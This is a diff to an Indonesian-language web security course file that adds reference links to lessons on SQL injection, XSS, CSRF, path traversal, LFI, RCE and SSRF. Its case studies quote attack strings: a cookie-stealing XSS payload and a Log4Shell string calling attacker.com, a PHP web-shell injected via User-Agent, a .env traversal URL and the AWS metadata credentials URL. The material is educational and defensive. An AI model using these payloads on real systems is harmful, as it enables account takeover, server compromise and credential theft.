@@ -52,7 +52,14 @@
         "title": "Kebocoran Data 2,3 Juta Warga dari Website Pemerintahan Indonesia 2024",
         "story": "Pada Maret 2024, sebuah website layanan publik milik pemerintah daerah di Indonesia mengalami kebocoran data masif yang mengkompromikan informasi pribadi 2,3 juta warga, termasuk NIK, nama lengkap, alamat, nomor telepon, dan data keluarga. Investigasi forensik mengungkap bahwa penyerang mengeksploitasi SQL Injection vulnerability pada fitur pencarian data warga. Aplikasi web tersebut dibangun menggunakan framework PHP custom tanpa menggunakan prepared statements — query database dibangun dengan string concatenation langsung dari input user. Penyerang menggunakan SQLMap untuk mengotomatisasi ekstraksi data, dan dalam waktu 6 jam, seluruh database warga berhasil diunduh. Data tersebut kemudian dijual di forum dark web seharga 0,5 Bitcoin (sekitar 500 juta rupiah). Insiden ini memicu investigasi dari BSSN dan Komisi I DPR, serta audit keamanan menyeluruh terhadap website pemerintahan lainnya. Banyak website ditemukan memiliki kerentanan serupa — menggunakan CMS usang, plugin bajakan, atau custom code tanpa security review.",
         "lesson": "Kasus ini adalah pengingat keras bahwa web attack dapat memiliki dampak yang sangat nyata pada kehidupan warga negara. Pelajaran kritis: 1) JANGAN PERNAH membangun query database dengan string concatenation — selalu gunakan prepared statements atau parameterized queries. 2) Untuk website pemerintahan, wajib menggunakan framework modern dengan security features built-in (seperti Laravel, Django, atau Spring Boot) alih-alih custom PHP tanpa framework. 3) Implementasi WAF (Web Application Firewall) seperti ModSecurity atau layanan cloud seperti Cloudflare untuk filter request malicious. 4) Lakukan penetration testing berkala oleh ethical hacker sebelum deployment dan secara rutin setelahnya. 5) Patch management yang disiplin — update CMS, plugin, dan dependencies segera setelah security patch dirilis. 6) Data pribadi warga harus dienkripsi di database dan access control harus sangat ketat — prinsip least privilege harus diterapkan."
-      }
+      },
+      "references": [
+        "https://owasp.org/www-project-top-ten/ - OWASP Top 10 Web Application Security Risks",
+        "https://www.verizon.com/business/resources/reports/dbir/ - Verizon Data Breach Investigations Report 2024",
+        "https://www.bssn.go.id/berita/laporan-keamanan-siber - BSSN Laporan Keamanan Siber Indonesia",
+        "https://owasp.org/www-project-application-security-verification-standard/ - OWASP ASVS",
+        "https://cheatsheetseries.owasp.org/ - OWASP Cheat Sheet Series"
+      ]
     },
     "1": {
       "subtitle": "SQL Injection",
@@ -88,7 +95,13 @@
         "title": "Serangan SQL Injection pada Platform E-Learning Nasional 2023",
         "story": "Pada September 2023, sebuah platform e-learning yang digunakan oleh lebih dari 5 juta siswa dan guru di Indonesia menjadi korban SQL Injection attack yang mengakibatkan kebocoran data masif. Platform tersebut dibangun menggunakan framework PHP custom dan memiliki fitur 'search student' yang rentan. Penyerang, yang diduga merupakan bagian dari hacktivist group, menggunakan SQLMap untuk mengotomatisasi ekstraksi data. Dalam waktu 12 jam, mereka berhasil mengekstrak data dari 3 tabel kritis: users (berisi 5,2 juta record dengan username, password hashed dengan MD5 tanpa salt, email, dan nomor telepon), students (berisi data akademik dan alamat), dan teachers (berisi NIP dan data pribadi). Password yang di-hash dengan MD5 tanpa salt dapat di-crack dalam hitungan menit menggunakan rainbow tables. Penyerang kemudian mempublikasikan sampel data di Twitter sebagai 'bukti' dan menuntut platform untuk 'memperbaiki keamanan mereka'. Insiden ini memicu investigasi dari Kemendikbudristek dan BSSN, serta audit keamanan terhadap platform e-learning lainnya. Banyak platform ditemukan memiliki kerentanan serupa — menggunakan MD5 untuk password hashing dan tidak menggunakan prepared statements.",
         "lesson": "Kasus ini menunjukkan bahwa SQL Injection masih sangat relevan di tahun 2023, bahkan di platform yang digunakan oleh jutaan pengguna. Pelajaran kritis: 1) JANGAN PERNAH menggunakan MD5 atau SHA1 untuk password hashing — gunakan algoritma modern seperti bcrypt, Argon2, atau PBKDF2 dengan salt yang unik per user. 2) Selalu gunakan prepared statements atau ORM yang reputable untuk semua query database. 3) Implementasi least privilege — database user aplikasi hanya boleh memiliki SELECT, INSERT, UPDATE, DELETE pada tabel yang diperlukan, bukan DROP TABLE atau akses ke sistem tables. 4) WAF dapat memblokir banyak serangan SQL Injection otomatis, namun bukan pengganti secure coding. 5) Monitoring anomali — query yang mengembalikan jutaan row atau akses ke tabel sensitif harus memicu alert segera. 6) Incident response plan — ketika kebocoran terjadi, segera notify pengguna untuk mengganti password dan monitor aktivitas mencurigakan."
-      }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/SQL_Injection - OWASP SQL Injection",
+        "https://portswigger.net/web-security/sql-injection - PortSwigger SQL Injection",
+        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html - OWASP SQL Injection Prevention",
+        "https://www.bssn.go.id/berita/sql-injection-website-pemerintahan - BSSN SQL Injection Advisory"
+      ]
     },
     "2": {
       "subtitle": "Cross-Site Scripting (XSS)",
@@ -122,9 +135,15 @@
       ],
       "case_study": {
         "title": "Stored XSS pada Platform E-Commerce Besar Indonesia 2024",
-        "story": "Pada Januari 2024, sebuah platform e-commerce besar di Indonesia (dengan lebih dari 50 juta pengguna aktif) mengalami insiden Stored XSS yang sangat serius. Kerentanan ditemukan pada fitur 'product review' — ketika pengguna menulis review, platform menyimpan review tersebut di database dan menampilkannya di halaman produk tanpa sanitasi yang memadai. Seorang security researcher (yang berpartisipasi dalam bug bounty program platform tersebut) menemukan bahwa ia dapat menyuntikkan script malicious dalam review: '<img src=x onerror=fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)>'. Ketika pengguna lain mengunjungi halaman produk dan melihat review tersebut, script dieksekusi dan mencuri session cookie mereka. Researcher tersebut melaporkan kerentanan ini secara responsible disclosure, namun sebelum platform sempat mempatch, seorang penyerang black-hat menemukan kerentanan yang sama dan mulai mengeksploitasinya secara massal. Dalam waktu 48 jam, lebih dari 100.000 session cookie berhasil dicuri dan digunakan untuk mengakses akun korban, melakukan pembelian fiktif, dan mengubah alamat pengiriman untuk penipuan. Platform berhasil memitigasi dengan segera mempatch kerentanan, memaksa logout semua sesi aktif, dan mengimplementasi CSP header yang ketat. Total kerugian diperkirakan mencapai 15 miliar rupiah dari transaksi fiktif.",
+        "story": "Pada Januari 2024, sebuah platform e-commerce besar di Indonesia (dengan lebih dari 50 juta pengguna aktif) mengalami insiden Stored XSS yang sangat serius. Kerentanan ditemukan pada fitur 'product review' — ketika pengguna menulis review, platform menyimpan review tersebut di database dan menampilkannya tanpa sanitasi yang memadai. Seorang security researcher (yang berpartisipasi dalam bug bounty program platform tersebut) menemukan bahwa ia dapat menyuntikkan script malicious dalam review: '<img src=x onerror=fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)>'. Ketika pengguna lain mengunjungi halaman produk dan melihat review tersebut, script dieksekusi dan mencuri session cookie mereka. Researcher tersebut melaporkan kerentanan ini secara responsible disclosure, namun sebelum platform sempat mempatch, seorang penyerang black-hat menemukan kerentanan yang sama dan mulai mengeksploitasinya secara massal. Dalam waktu 48 jam, lebih dari 100.000 session cookie berhasil dicuri dan digunakan untuk mengakses akun korban, melakukan pembelian fiktif, dan mengubah alamat pengiriman untuk penipuan. Platform berhasil memitigasi dengan segera mempatch kerentanan, memaksa logout semua sesi aktif, dan mengimplementasi CSP header yang ketat. Total kerugian diperkirakan mencapai 15 miliar rupiah dari transaksi fiktif.",
         "lesson": "Kasus ini menunjukkan bahwa bahkan platform besar dengan tim security yang dedicated pun dapat terkena XSS jika sanitasi tidak dilakukan secara konsisten di semua titik. Pelajaran kritis: 1) Output encoding adalah NON-NEGOTIABLE untuk semua konten yang berasal dari user — tidak ada pengecualian. 2) Implementasi CSP header yang ketat untuk memblokir script yang tidak diizinkan, bahkan jika XSS berhasil disuntikkan. 3) HttpOnly flag pada session cookie adalah pertahanan penting — meskipun XSS terjadi, penyerang tidak dapat mencuri session cookie. 4) Bug bounty program adalah investasi yang sangat berharga — researcher yang bertanggung jawab akan melaporkan kerentanan sebelum dieksploitasi oleh penyerang black-hat. 5) Incident response plan harus mencakup kemampuan untuk memaksa logout semua sesi aktif jika terjadi kompromi massal. 6) Regular penetration testing oleh ethical hacker dapat menemukan kerentanan sebelum dieksploitasi."
-      }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/xss/ - OWASP Cross-Site Scripting (XSS)",
+        "https://portswigger.net/web-security/cross-site-scripting - PortSwigger XSS",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html - OWASP XSS Prevention",
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP - MDN Content Security Policy"
+      ]
     },
     "3": {
       "subtitle": "Clickjacking",
@@ -160,7 +179,13 @@
         "title": "Kampanye Clickjacking 'Free Bitcoin' yang Menargetkan Pengguna Crypto Indonesia 2023",
         "story": "Pada pertengahan 2023, sebuah kampanye clickjacking masif menargetkan pengguna cryptocurrency di Indonesia melalui iklan di media sosial dan forum crypto. Iklan tersebut menjanjikan 'Free Bitcoin - Klaim 0.1 BTC Sekarang!' dengan tombol besar yang menarik perhatian. Ketika korban mengklik iklan, mereka diarahkan ke halaman yang tampak seperti giveaway legit dari exchange crypto terkenal. Halaman tersebut memiliki tombol 'Claim Now' yang besar dan mencolok. Namun, di balik layar, halaman tersebut menyertakan iframe transparan yang memuat halaman login exchange crypto populer. Iframe diposisikan sedemikian rupa sehingga tombol 'Claim Now' berada tepat di atas tombol 'Login' di halaman exchange. Ketika korban mengklik 'Claim Now', mereka sebenarnya mengklik 'Login' di exchange, dan jika mereka sudah login sebelumnya (session aktif), mereka diarahkan ke halaman transfer yang sudah di-pre-fill dengan alamat wallet penyerang dan jumlah tertentu. Beberapa korban yang tidak teliti mengkonfirmasi transfer tanpa memeriksa detail, mengakibatkan kerugian total lebih dari 2 miliar rupiah dari puluhan korban. Kampanye ini terdeteksi oleh komunitas security Indonesia dan dilaporkan ke Bareskrim Polri, yang kemudian berhasil mengidentifikasi pelaku dan memblokir domain yang digunakan.",
         "lesson": "Kasus ini menunjukkan bahwa clickjacking dapat sangat efektif ketika dikombinasikan dengan social engineering (janji hadiah) dan eksploitasi session yang sudah aktif. Pelajaran kritis: 1) Selalu implementasi X-Frame-Options atau CSP frame-ancestors di semua halaman dengan aksi sensitif (login, transfer, perubahan pengaturan). 2) Untuk pengguna: JANGAN PERNAH mengklik tautan yang menjanjikan hadiah yang terlalu bagus untuk menjadi kenyataan, terutama di media sosial atau forum. 3) Selalu periksa URL di address bar sebelum melakukan aksi sensitif — jika URL tidak sesuai dengan yang Anda harapkan, JANGAN lanjutkan. 4) Gunakan browser dengan proteksi clickjacking built-in (seperti Firefox dengan Clickjacking protection atau extension seperti NoScript). 5) Untuk exchange crypto dan platform finansial: implementasi konfirmasi multi-step untuk transfer (misalnya, wajibkan input PIN atau OTP bahkan jika session aktif) untuk memitigasi dampak clickjacking."
-      }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/Clickjacking - OWASP Clickjacking",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html - OWASP Clickjacking Defense",
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options - MDN X-Frame-Options",
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors - MDN CSP frame-ancestors"
+      ]
     },
     "4": {
       "subtitle": "CSRF Attack",
@@ -196,12 +221,18 @@
         "title": "CSRF pada Aplikasi Internet Banking Bank Regional Indonesia 2023",
         "story": "Pada akhir 2023, sebuah bank regional di Indonesia mengalami insiden CSRF yang mengakibatkan kerugian finansial bagi beberapa nasabah. Aplikasi internet banking mereka memiliki fitur 'transfer antar rekening' yang rentan terhadap CSRF — tidak ada anti-CSRF token, dan cookie session tidak memiliki atribut SameSite. Penyerang membuat halaman web palsu dengan judul 'Menangkan Hadiah Umroh Gratis!' dan menyebarkannya melalui grup WhatsApp. Halaman tersebut mengandung form tersembunyi yang melakukan POST request ke URL transfer bank dengan parameter rekening tujuan (rekening penyerang) dan jumlah transfer. Ketika nasabah yang sudah login ke internet banking mengunjungi halaman palsu tersebut, form secara otomatis di-submit di latar belakang, dan transfer terjadi tanpa sepengetahuan nasabah. Dalam 3 hari, lebih dari 50 nasabah menjadi korban dengan total kerugian mencapai 1,2 miliar rupiah. Insiden ini terdeteksi ketika beberapa nasabah komplain tentang transaksi yang tidak mereka lakukan, dan investigasi forensik mengungkap pola CSRF. Bank segera mempatch aplikasi dengan mengimplementasi anti-CSRF token dan SameSite cookie, serta mengganti kerugian nasabah yang terdampak.",
         "lesson": "Kasus ini menunjukkan bahwa CSRF masih merupakan ancaman nyata di tahun 2023, bahkan untuk aplikasi finansial yang seharusnya memiliki standar keamanan tinggi. Pelajaran kritis: 1) Anti-CSRF token adalah NON-NEGOTIABLE untuk semua form dan request sensitif — tidak ada pengecualian. 2) SameSite cookie attribute (minimal Lax) harus di-set untuk semua cookie session. 3) Untuk aplikasi finansial, re-authentication (input password lagi atau OTP) untuk transfer di atas nominal tertentu adalah pertahanan penting yang memitigasi CSRF bahkan jika token berhasil di-bypass. 4) Regular security testing dengan tools seperti OWASP ZAP atau Burp Suite dapat mendeteksi kerentanan CSRF sebelum dieksploitasi. 5) Edukasi pengguna: JANGAN mengklik tautan yang menjanjikan hadiah yang terlalu bagus untuk menjadi kenyataan, terutama di WhatsApp atau media sosial."
-      }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/csrf - OWASP CSRF",
+        "https://portswigger.net/web-security/csrf - PortSwigger CSRF",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html - OWASP CSRF Prevention",
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value - MDN SameSite Cookies"
+      ]
     },
     "5": {
       "subtitle": "Directory Traversal",
       "quote": "Ketika aplikasi web Anda mengizinkan pengguna untuk menentukan path file tanpa validasi yang ketat, Anda secara tidak sengaja memberikan mereka peta untuk menjelajahi seluruh sistem file server — dan Directory Traversal adalah seni membaca peta tersebut.",
-      "definition": "Directory Traversal (juga dikenal sebagai Path Traversal atau ../ attack) adalah kerentanan keamanan di mana penyerang dapat mengakses file dan direktori di luar direktori yang diizinkan oleh aplikasi web, dengan memanipulasi variabel yang mereferensikan file melalui karakter 'dot-dot-slash' (../) atau varian lainnya. Teknik ini mengeksploitasi kelemahan di mana aplikasi membangun path file berdasarkan input pengguna tanpa sanitasi atau validasi yang tepat. Dengan menggunakan sequence '../' untuk naik ke direktori parent, penyerang dapat 'traverse' (menjelajah) struktur direktori server dan mengakses file sensitif seperti /etc/passwd (daftar user di Linux), file konfigurasi aplikasi, source code, atau bahkan file sistem operasi. Directory Traversal dapat menjadi pintu masuk untuk serangan yang lebih serius seperti informasi disclosure, code execution, atau full server compromise.",
+      "definition": "Directory Traversal (juga dikenal sebagai Path Traversal atau ../ attack) adalah kerentanan keamanan di mana penyerang dapat mengakses file dan direktori di luar direktori yang diizinkan oleh aplikasi web, dengan memanipulasi variabel yang mereferensikan file melalui karakter 'dot-dot-slash' (../) atau varian lainnya. Teknik ini mengeksploitasi kelemahan di mana aplikasi membangun path file berdasarkan input pengguna tanpa sanitasi atau validasi yang tepat. Dengan menggunakan sequence '../' untuk naik ke direktori parent, penyerang dapat 'traverse' (menjelajah) struktur direktori server dan mengakses file sensitif seperti /etc/passwd (daftar user di Linux), file konfigurasi aplikasi, source code, atau bahkan file sistem operasi. Directory Traversal dapat menjadi pintu masuk untuk serangan yang lebih serius seperti information disclosure, code execution, atau full server compromise.",
       "sections": [
         {
           "title": "Mekanisme Directory Traversal: Dari ../ ke Null Byte Injection",
@@ -232,7 +263,13 @@
         "title": "Kebocoran Massal File '.env' pada Portal Startup dan BUMN 2023",
         "story": "Pada pertengahan 2023, seorang security researcher independen di Indonesia menemukan kerentanan Directory Traversal pada sebuah library PDF generator open-source yang banyak digunakan oleh startup fintech dan portal layanan BUMN. Library tersebut memiliki fitur 'attach invoice' yang menerima parameter path file dari user tanpa sanitasi. Penyerang dapat mengakses URL '/api/generate?template=../../../../.env' dan mengunduh file '.env' dari server. File .env ini berisi 'APP_KEY' (kunci enkripsi session Laravel), kredensial database MySQL production, dan API secret keys untuk layanan seperti Midtrans, AWS S3, dan Twilio. Dengan APP_KEY, penyerang dapat memalsukan session cookie admin (deserialization attack) dan mengambil alih dashboard. Dengan API key AWS, beberapa server korban digunakan untuk menambang cryptocurrency secara ilegal, menghasilkan tagihan cloud yang membengkak hingga ratusan juta rupiah per instansi.",
         "lesson": "Kasus ini menyoroti bahaya dari 'supply chain vulnerability' di mana satu library pihak ketiga yang rentan dapat mengkompromikan ribuan aplikasi yang menggunakannya. Pelajaran kritis: 1) File konfigurasi seperti .env, wp-config.php, atau credentials.json JANGAN PERNAH berada di direktori yang dapat diakses oleh web server (public webroot). 2) Selalu gunakan indirect references (ID database) alih-alih nama file langsung untuk fitur download. 3) Rutin audit dependencies menggunakan tools seperti Snyk, Dependabot, atau npm audit untuk mendeteksi kerentanan pada library pihak ketiga. 4) Simpan secret keys di layanan manajemen rahasia khusus seperti HashiCorp Vault, AWS Secrets Manager, atau Azure Key Vault, bukan di file teks biasa di server."
-      }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/Path_Traversal - OWASP Path Traversal",
+        "https://portswigger.net/web-security/file-path-traversal - PortSwigger Directory Traversal",
+        "https://cwe.mitre.org/data/definitions/22.html - CWE-22: Path Traversal",
+        "https://cheatsheetseries.owasp.org/cheatsheets/File_Inclusion.html - OWASP File Inclusion"
+      ]
     },
     "6": {
       "subtitle": "File Inclusion (LFI/RFI)",
@@ -268,7 +305,13 @@
         "title": "Eksploitasi LFI via Log Poisoning pada Server E-Commerce Legacy 2023",
         "story": "Sebuah platform e-commerce B2B di Indonesia yang masih menggunakan stack PHP native (tanpa framework modern) mengalami kompromi total pada server produksi mereka. Aplikasi memiliki fitur 'preview template email' yang menggunakan fungsi include() dengan parameter dari URL: 'include(\"templates/\" . $_GET['tpl'] . \".html\");'. Penyerang menemukan bahwa mereka dapat menggunakan Directory Traversal ('tpl=../../../../../var/log/nginx/access') untuk memuat log Nginx. Tahap pertama: penyerang mengirim request ke server dengan payload PHP di header User-Agent: 'User-Agent: <?php system($_REQUEST[\"cmd\"]); ?>'. Nginx mencatat ini ke access.log. Tahap kedua: penyerang mengakses URL preview template dengan parameter cmd: '?tpl=../../../../../var/log/nginx/access&cmd=cat /etc/passwd'. Server mengeksekusi kode di dalam log, mengembalikan isi /etc/passwd. Dengan shell ini, penyerang menginstal backdoor, mencuri database pelanggan, dan menanamkan ransomware yang mengenkripsi seluruh server. Downtime berlangsung selama 5 hari dan perusahaan harus membayar denda regulasi karena gagal melindungi data PII.",
         "lesson": "Kasus ini adalah textbook example dari bagaimana LFI yang dikombinasikan dengan Log Poisoning dapat menghancurkan infrastruktur. Pelajaran kritis: 1) JANGAN PERNAH menggunakan input user secara langsung di dalam fungsi include(), require(), atau eval(). 2) Matikan allow_url_include dan gunakan open_basedir di php.ini untuk membatasi damage radius. 3) Pisahkan direktori log dari direktori yang dapat diakses atau di-include oleh aplikasi web. 4) Migrasi dari PHP native ke framework modern (Laravel/Symfony) yang memiliki arsitektur routing aman dan secara default mencegah praktik include dinamis yang berbahaya."
-      }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/File_Inclusion - OWASP File Inclusion",
+        "https://portswigger.net/web-security/file-inclusion - PortSwigger LFI/RFI",
+        "https://www.php.net/manual/en/security.includes.php - PHP Security: Remote File Inclusion",
+        "https://cwe.mitre.org/data/definitions/98.html - CWE-98: Improper Control of Filename for Include/Require Statement"
+      ]
     },
     "7": {
       "subtitle": "Remote Code Execution (RCE)",
@@ -304,7 +347,14 @@
         "title": "Log4Shell (CVE-2021-44228): RCE Massal yang Melumpuhkan Infrastruktur Digital",
         "story": "Pada Desember 2021, dunia keamanan siber diguncang oleh penemuan kerentanan RCE pada Log4j, sebuah library logging Java yang sangat populer dan digunakan oleh jutaan aplikasi enterprise, termasuk sistem core banking, telekomunikasi, dan platform cloud di Indonesia. Kerentanan yang dijuluki 'Log4Shell' (CVE-2021-44228) ini dieksploitasi melalui fitur JNDI Lookup di Log4j. Penyerang cukup menyuntikkan string '${jndi:ldap://attacker.com/exploit}' ke dalam input apa pun yang di-log oleh aplikasi (seperti User-Agent, username login, atau header HTTP). Ketika Log4j memproses string ini, ia akan melakukan koneksi LDAP ke server penyerang, mengunduh class Java malicious, dan mengeksekusinya di server korban. Eksploitasi ini sangat mudah (hanya satu baris string) namun dampaknya sangat masif (RCE penuh). Di Indonesia, banyak institusi keuangan dan pemerintahan yang menggunakan aplikasi Java legacy mengalami kepanikan, memaksa tim IT untuk bekerja 24/7 selama berminggu-minggu untuk melakukan patching darurat, memblokir traffic LDAP keluar, dan memburu backdoor yang sudah ditanam oleh berbagai kelompok ransomware dan APT.",
         "lesson": "Log4Shell adalah pengingat brutal tentang risiko 'Supply Chain Security' dan betapa bahayanya satu library open-source yang dianggap remeh dapat meruntuhkan infrastruktur global. Pelajaran kritis: 1) Inventarisasi semua dependencies (Software Bill of Materials / SBOM) adalah keharusan. Anda tidak bisa mempatch apa yang tidak Anda tahu Anda miliki. 2) Batasi outbound traffic dari server produksi. Server web seharusnya tidak perlu melakukan koneksi LDAP, RMI, atau HTTP ke internet publik sembarangan. 3) Matikan fitur yang tidak perlu (seperti JNDI lookup di Log4j atau allow_url_include di PHP). 4) Gunakan tools SCA (Software Composition Analysis) seperti Snyk atau Dependabot untuk memonitor kerentanan pada library pihak ketiga secara real-time."
-      }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/Command_Injection - OWASP Command Injection",
+        "https://portswigger.net/web-security/os-command-injection - PortSwigger Command Injection",
+        "https://www.cisa.gov/news-events/alerts/2021/12/10/cisa-releases-first-advisory-log4j-vulnerability - CISA Log4Shell Advisory",
+        "https://logging.apache.org/log4j/2.x/security.html - Apache Log4j Security Vulnerabilities",
+        "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data - OWASP Insecure Deserialization"
+      ]
     },
     "8": {
       "subtitle": "SSRF Attack",
@@ -340,7 +390,14 @@
         "title": "Kompromi Infrastruktur Cloud Startup SaaS Jakarta via SSRF 2024",
         "story": "Pada awal 2024, sebuah startup SaaS B2B di Jakarta yang menyediakan layanan analitik website mengalami insiden keamanan fatal. Aplikasi mereka memiliki fitur 'Add Custom Webhook' di mana pengguna dapat memasukkan URL endpoint untuk menerima notifikasi. Fitur ini rentan terhadap Blind SSRF karena tidak memvalidasi IP tujuan. Seorang penyerang menemukan fitur ini dan mulai menggunakan URL metadata AWS: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-full-access-role'. Meskipun respons tidak ditampilkan ke UI (Blind), penyerang menggunakan teknik DNS logging (mengarahkan request ke domain yang mereka kontrol) untuk memverifikasi bahwa server memang mengakses URL tersebut. Dengan memanfaatkan celah di library parser URL yang salah menangani karakter '@', penyerang berhasil membypass filter internal dan mengekstrak Access Key dan Secret Key dari IAM Role yang memiliki permission 's3:*' (akses penuh ke semua bucket S3). Penyerang kemudian mengunduh seluruh database backup pelanggan (termasuk PII dan data finansial) dan meminta tebusan 5 Bitcoin. Startup tersebut terpaksa mematikan layanan selama seminggu dan menghadapi tuntutan class-action dari klien enterprise mereka.",
         "lesson": "Kasus ini menunjukkan bahwa di era cloud, SSRF bukan lagi sekadar kerentanan 'port scanning', melainkan pintu langsung menuju kompromi infrastruktur level cloud. Pelajaran kritis: 1) JANGAN PERNAH mempercayai URL yang diinput oleh pengguna. Selalu gunakan Allowlist domain. 2) Di AWS, WAJIBKAN penggunaan IMDSv2 untuk semua instance EC2 dan matikan IMDSv1. 3) Terapkan prinsip Least Privilege pada IAM Roles. Server web tidak boleh memiliki role 's3:*' atau 'AdministratorAccess'. Berikan hanya permission spesifik yang dibutuhkan (misalnya 's3:GetObject' pada satu bucket tertentu). 4) Isolasi fitur yang melakukan request outbound (seperti webhook atau PDF generator) di container atau microservice terpisah yang tidak memiliki akses ke metadata service atau jaringan internal."
-      }
+      },
+      "references": [
+        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery - OWASP SSRF",
+        "https://portswigger.net/web-security/ssrf - PortSwigger SSRF",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html - OWASP SSRF Prevention",
+        "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html - AWS Instance Metadata Service",
+        "https://cwe.mitre.org/data/definitions/918.html - CWE-918: Server-Side Request Forgery (SSRF)"
+      ]
     }
   }
 }
